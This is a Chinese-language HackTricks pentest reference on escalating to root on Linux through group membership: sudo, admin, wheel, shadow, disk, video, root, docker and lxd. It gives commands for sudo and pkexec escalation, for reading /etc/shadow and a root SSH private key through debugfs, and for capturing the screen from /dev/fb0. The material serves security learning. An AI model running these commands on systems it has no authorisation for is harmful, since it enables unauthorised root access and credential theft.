<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>

其他支持HackTricks的方式：

* 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我们的**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>


# Sudo/Admin 组

## **PE - 方法1**

**有时**，**默认情况下（或因为某些软件需要）**，您可以在**/etc/sudoers**文件中找到以下一些行：
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
这意味着**属于sudo或admin组的任何用户都可以作为sudo执行任何操作**。

如果是这种情况，要**成为root用户，只需执行**：
```text
sudo su
```
## 提权 - 方法 2

查找所有SUID二进制文件，并检查是否存在二进制文件 **Pkexec**：
```bash
find / -perm -4000 2>/dev/null
```
如果发现二进制文件pkexec是一个SUID二进制文件，并且你属于sudo或admin组，那么可能可以使用pkexec以sudo权限执行二进制文件。
检查以下内容：
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
在那里，您将找到允许执行**pkexec**和**默认情况下**在某些Linux中可能会出现一些组**sudo或admin**。

要**成为root用户，您可以执行**：
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
如果尝试执行**pkexec**时出现以下**错误**：
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**这不是因为你没有权限，而是因为你没有连接到图形界面**。这里有一个解决此问题的方法：[https://github.com/NixOS/nixpkgs/issues/18012\#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)。你需要**2个不同的ssh会话**：

{% code title="session1" %}
```bash
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```
{% endcode %}

{% code title="session2" %}
```bash
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
{% endcode %}

# Wheel Group

**有时候**，**默认情况下**，您可以在**/etc/sudoers**文件中找到这行：
```text
%wheel	ALL=(ALL:ALL) ALL
```
这意味着**任何属于wheel组的用户都可以作为sudo执行任何操作**。

如果是这种情况，**要成为root用户，只需执行**：
```text
sudo su
```
# 阴影组

来自**阴影组**的用户可以**读取**`/etc/shadow`文件：
```text
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
所以，阅读文件并尝试**破解一些哈希值**。

# 磁盘组

这种权限几乎等同于root访问权限，因为您可以访问机器内部的所有数据。

文件：`/dev/sd[a-z][1-9]`
```text
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
请注意，使用debugfs您也可以**写入文件**。例如，要将`/tmp/asd1.txt`复制到`/tmp/asd2.txt`，您可以执行以下操作：
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
然而，如果您尝试**写入属于root的文件**（如`/etc/shadow`或`/etc/passwd`），您将收到“**Permission denied**”错误。

# Video Group

使用命令`w`，您可以找到**谁登录到系统**，并且它将显示以下输出：
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
**tty1** 表示用户 **yossi 是物理登录** 到机器上的终端。

**video 组** 具有查看屏幕输出的权限。基本上，您可以观察屏幕。为了做到这一点，您需要以原始数据的形式 **获取屏幕上的当前图像** 并获取屏幕正在使用的分辨率。屏幕数据可以保存在 `/dev/fb0` 中，您可以在 `/sys/class/graphics/fb0/virtual_size` 中找到此屏幕的分辨率。
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
**打开**原始图像，可以使用**GIMP**，选择**`screen.raw`**文件，并选择文件类型为**原始图像数据**：

![](../../.gitbook/assets/image%20%28208%29.png)

然后修改宽度和高度为屏幕上使用的值，并检查不同的图像类型（选择显示屏幕效果更好的类型）：

![](../../.gitbook/assets/image%20%28295%29.png)

# Root 组

看起来默认情况下，**root 组的成员**可以访问**修改**一些**服务**配置文件或一些**库**文件或**其他有趣的东西**，这些可能被用来提升权限...

**检查 root 成员可以修改哪些文件**：
```bash
find / -group root -perm -g=w 2>/dev/null
```
# Docker组

您可以将主机机器的根文件系统挂载到实例的卷上，这样当实例启动时，它会立即将`chroot`加载到该卷中。这实际上让您在机器上获得了root权限。

{% embed url="https://github.com/KrustyHack/docker-privilege-escalation" %}

{% embed url="https://fosterelli.co/privilege-escalation-via-docker.html" %}

# lxc/lxd组

[lxc - 特权升级](lxd-privilege-escalation.md)



<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我们的**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>
